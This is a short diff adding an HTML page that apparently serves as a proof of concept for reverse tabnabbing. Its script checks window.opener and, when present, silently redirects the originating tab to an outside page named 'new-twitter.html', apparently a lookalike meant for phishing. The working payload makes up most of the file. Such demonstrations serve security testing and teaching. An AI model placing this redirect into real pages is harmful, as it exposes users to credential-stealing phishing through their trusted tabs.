@@ -1,0 +1,8 @@
+<h1>imagine there is some semi-useful content here.<br>now, go back to the tab you opened this page from...</h1>
+<script>
+  if(window.opener == null) {
+    alert('not vulnerable, nevermind...')
+  } else {
+    window.opener.location ='http://parismitton.com/new-twitter.html';
+  }
+</script>
